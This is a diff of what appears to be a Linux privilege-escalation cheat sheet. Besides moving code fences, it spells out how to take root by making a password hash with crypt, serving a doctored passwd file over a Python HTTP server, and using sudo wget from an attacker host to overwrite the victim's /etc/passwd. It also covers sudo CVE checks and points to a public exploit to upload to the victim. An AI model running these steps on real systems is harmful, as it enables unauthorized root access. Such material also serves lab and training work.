@@ -280,14 +280,16 @@ sudo /home/anansi/bin/anansi_util manual /bin/bash
 ```
 
 Wget
-```
-Victim
 
+Victim
+```
 cp /etc/passwd /tmp/passwd
 cat /etc/passwd
 
+```
 Attacker
 
+```
 Copy /etc/passwd content and put in a local file called passwd
 Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
 Copy output of the above command 
@@ -296,12 +298,18 @@ Replace x in root's line with the copied output
 Save the file
 python -m SimpleHTTPServer 9000 // You can use any port
 
+```
+
 Victim
+
+```
 sudo wget http://<attacker_ip>:9000/passwd -O /etc/passwd
 su root // Enter the new root password you generated (Example: NewRootPassword)
 id && whoami
 
 ```
+
+
 # Sudo CVE
 Expliot sudo with known CVE
 
@@ -327,8 +335,11 @@ Output = (ALL,!root) NOPASSWD: /bin/bash
 CVE-2019-16634
 
 sudo -V // Get sudo version
+
 sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled
+
 Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634
+
 Download expliot.c
 Upload to Victim 
 
